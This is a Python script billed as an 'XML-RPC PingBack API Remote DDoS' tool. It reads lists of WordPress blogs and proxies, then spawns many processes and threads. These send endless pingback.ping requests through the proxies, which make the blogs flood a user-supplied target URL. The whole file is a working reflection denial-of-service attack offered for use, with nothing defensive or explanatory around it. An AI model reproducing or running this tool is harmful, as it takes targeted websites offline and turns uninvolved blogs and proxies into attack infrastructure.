import sys, socket, threading, time, os, random, multiprocessing

class MyProcess(multiprocessing.Process):
    def __init__(self, url, lista, lista_proxy, th_num):
        multiprocessing.Process.__init__(self)
        self.url = url
        self.lista = lista
        self.lista_proxy = lista_proxy
        self.number = th_num
    def run(self):
        for i in range(self.number):
            Request(self.url, self.lista, self.lista_proxy).start()

class Request(threading.Thread):
    
    def __init__(self, url, lista, lista_proxy):
        threading.Thread.__init__(self)
        self.url = url
        self.lista = lista
        self.lista_proxy = lista_proxy
        self.blog = random.choice(lista)
        
    def run(self):
        function_pingback = "<?xml version='1.0' encoding='iso-8859-1'?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>%s</string></value></param><param><value><string>%s</string></value></param></params></methodCall>" % (self.url, self.blog)
        request_lenght = len(function_pingback)
        
        while True:
                
                try:
                    sikh = random.choice(self.lista_proxy).split(':')
                    blog_cleaned = self.blog.split("?p=")[0]
                    blog_cleaned1 = blog_cleaned.split("http://")[1].split("/")[0]
                    request = "POST %s/xmlrpc.php HTTP/1.0\r\nHost: %s\r\nUser-Agent: Internal Wordpress RPC connection\r\nContent-Type: text/xml\r\nContent-Length: %s\r\n\n<?xml version=\"1.0\" encoding=\"iso-8859-1\"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>%s</string></value></param><param><value><string>%s</string></value></param></params></methodCall>\r\n\r\n" % (blog_cleaned, blog_cleaned1, request_lenght, self.url, self.blog)
                      
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((sikh[0], int(sikh[1])))
                    s.send(request.encode())
                    s.close
                    print ("PingBack Request | Proxy %s -> Blog %s" % (sikh[0], blog_cleaned1, ))
                except:
                    pass

def title():
    os.system("title ...:: XMLRPC PingBack DDoS ::... ")
    os.system("color a")
    print ("""-------------------------------------------------------------------------\n
\tXML-RPC PingBack API Remote DDoS v 2.0
\tDate : 11/07/2014
\tPython 3.3.3
\tPython version coded by : Xordas && Sikh887\n
-------------------------------------------------------------------------\n\n""")
    
def main():
    title()
    try:
        in_file = open("list.txt", "r")
        lista = []
        for i in in_file:
            lista.append(i)
    except:
        print ("I can't find list.txt. To run the program you need it.")
        sys.exit(0)
    try:
        in_file_p = open("proxy.txt", "r")
        lista_proxy = []
        for i in in_file_p:
            lista_proxy.append(i.split("/n")[0])
    except:
        print ("I can't find proxy.txt. To run the program you need it.")
        sys.exit(0)
    url = str(input("> Url: "))
    pool = int(input("> Number of Process: "))
    th_num = int(input("> Number of Thread: "))
    for i in range(pool + 1):
        MyProcess(url, lista, lista_proxy, th_num).start()
if __name__ == "__main__":
    main()